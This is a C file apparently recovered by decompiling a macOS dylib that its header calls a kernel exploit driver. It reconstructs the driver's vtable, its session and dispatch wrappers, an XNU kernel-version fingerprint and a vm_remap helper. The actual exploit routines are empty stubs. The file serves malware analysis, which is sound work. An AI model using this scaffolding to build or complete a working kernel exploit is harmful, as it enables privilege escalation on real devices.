/*
 * record_0x90000_driver.c
 * entry5_type0x09.dylib (377bed variant) — main kernel exploit driver (record 0x90000)
 *
 * Recovered from Ghidra decompilation of entry5_type0x09.dylib.
 * Verified: vtable layout, offsets, control flow, error codes.
 * Inferred: function role labels from call context and data flow.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <mach/mach.h>
#include <sys/sysctl.h>

#define HEADER_VERSION  0x00020002
#define ERR_NULL_ARG    0x000a0001

/* ── forward declarations for internal helpers ───────────────────────────── */
static int  sub_3f5e4(void **out_session);
static void sub_3f708(void *session, uint64_t arg);
static void sub_3fa58(void *session);
static void sub_3fbe4(void *session);

/* ── vtable-backed driver object ─────────────────────────────────────────── */
typedef struct DriverObject {
    uint32_t header;        /* +0x00  0x00020002 */
    uint32_t _pad;
    void    *_unused;

    int  (*free_obj)    (struct DriverObject *self);                        /* +0x10 */
    int  (*create_sess) (struct DriverObject *self, uint64_t a2,
                         void **out);                                       /* +0x18 */
    int  (*destroy_sess)(struct DriverObject *self, void *sess);            /* +0x20 */
    int  (*dispatch)    (struct DriverObject *self, void *sess,
                         uint64_t cmd);                                     /* +0x28 */
    int  (*secondary)   (struct DriverObject *self, void *sess);            /* +0x30 */
    int  (*read_status) (struct DriverObject *self, void *sess,
                         int *out);                                         /* +0x38 */
    int  (*batch)       (struct DriverObject *self, void **sess_ptr,
                         uint32_t *ops, int count);                         /* +0x40 */
    int  (*kv_triple)   (struct DriverObject *self, size_t *out);           /* +0x48 */
} DriverObject;

/* ── +0x10  free_obj ─────────────────────────────────────────────────────── */
static int vtbl_free_obj(DriverObject *self)
{
    if (!self) return 0;
    memset(self, 0, 0x50);
    free(self);
    return 0;
}

/* ── +0x18  create_sess ──────────────────────────────────────────────────── */
static int vtbl_create_sess(DriverObject *self, uint64_t a2, void **out)
{
    if (!self || !out) return 0;
    void *session = NULL;
    int rc = sub_3f5e4(&session);
    if (rc == 0)
        *out = session;
    return rc;
}

/* ── +0x20  destroy_sess ─────────────────────────────────────────────────── */
static int vtbl_destroy_sess(DriverObject *self, void *sess)
{
    if (!self || !sess) return 0;
    sub_3fbe4(sess);
    return 0;
}

/* ── +0x28  dispatch ─────────────────────────────────────────────────────── */
static int vtbl_dispatch(DriverObject *self, void *sess, uint64_t cmd)
{
    if (!self || !sess) return 0;
    sub_3f708(sess, cmd);
    return 0;
}

/* ── +0x30  secondary ────────────────────────────────────────────────────── */
static int vtbl_secondary(DriverObject *self, void *sess)
{
    if (!self || !sess) return 0;
    sub_3fa58(sess);
    return 0;
}

/* ── +0x38  read_status ──────────────────────────────────────────────────── */
/*
 * Reads cached status word at session+0x1918.
 * Requires word+1 >= 2 (i.e. word >= 1).
 */
static int vtbl_read_status(DriverObject *self, void *sess, int *out)
{
    if (!self || !sess || !out) return 0;
    int val = *(int *)((uint8_t *)sess + 0x1918);
    if ((uint32_t)(val + 1) < 2) return 0;
    *out = val;
    return 0;
}

/* ── +0x40  batch ────────────────────────────────────────────────────────── */
/*
 * If sess_ptr points to NULL: calls sub_3f5e4 to create a new session.
 * If sess_ptr points to existing session and count != 0: dispatches ops.
 */
static int vtbl_batch(DriverObject *self, void **sess_ptr,
                      uint32_t *ops, int count)
{
    if (!self || !sess_ptr) return 0;

    void *sess = *sess_ptr;
    if (!sess) {
        void *new_sess = NULL;
        int rc = sub_3f5e4(&new_sess);
        if (rc == 0)
            *sess_ptr = new_sess;
        return rc;
    }

    if (count != 0 && ops != NULL) {
        for (int i = 0; i < count; i++)
            sub_3f708(sess, ops[i]);
    }
    return 0;
}

/* ── +0x48  kv_triple ────────────────────────────────────────────────────── */
/*
 * Parses kernel version triple from host_kernel_version().
 * Falls back to sysctl CTL_KERN.KERN_VERSION on error 53.
 * Requires "RELEASE" in the string.
 * out[0] = major (uint64), out[1] low 32 bits = minor.
 */
static int vtbl_kv_triple(DriverObject *self, size_t *out)
{
    if (!self || !out) return 0;

    char buf[512];
    memset(buf, 0, sizeof(buf));

    mach_port_t host = mach_host_self();
    kern_return_t kr = host_kernel_version(host, buf);

    if (kr != 0) {
        if (kr != 53) return 0;
        int mib[2] = { CTL_KERN, KERN_VERSION };
        size_t len = sizeof(buf);
        if (sysctl(mib, 2, buf, &len, NULL, 0) != 0) return 0;
    }

    char *p = strstr(buf, "RELEASE");
    if (!p) return 0;
    p = strstr(buf, "xnu-");
    if (!p) return 0;

    uint32_t major = 0, minor = 0, patch = 0;
    if (sscanf(p, "xnu-%u.%u.%u%*s", &major, &minor, &patch) != 3) return 0;

    out[0] = major;
    *(uint32_t *)(out + 1) = minor;
    return 0;
}

/* ── _driver export ──────────────────────────────────────────────────────── */
int _driver(void **out)
{
    if (!out) return 0;

    DriverObject *obj = calloc(1, sizeof(DriverObject));
    if (!obj) return 0;

    obj->header       = HEADER_VERSION;
    obj->free_obj     = vtbl_free_obj;
    obj->create_sess  = vtbl_create_sess;
    obj->destroy_sess = vtbl_destroy_sess;
    obj->dispatch     = vtbl_dispatch;
    obj->secondary    = vtbl_secondary;
    obj->read_status  = vtbl_read_status;
    obj->batch        = vtbl_batch;
    obj->kv_triple    = vtbl_kv_triple;

    *out = obj;
    return 0;
}

/* ── vm_remap helpers (FUN_00007c7c / FUN_00007d00) ─────────────────────── */
void vm_remap_copy(vm_address_t src, vm_size_t size, boolean_t copy)
{
    vm_prot_t cur_prot = 0, max_prot = 0;
    vm_address_t dst = 0;
    vm_remap(mach_task_self(), &dst, size, 0, 1,
             mach_task_self(), src, copy,
             &max_prot, &cur_prot, 1);
}

/* ── stubs ───────────────────────────────────────────────────────────────── */
static int  sub_3f5e4(void **o) { (void)o; return ERR_NULL_ARG; }
static void sub_3f708(void *s, uint64_t a) { (void)s; (void)a; }
static void sub_3fa58(void *s) { (void)s; }
static void sub_3fbe4(void *s) { (void)s; }
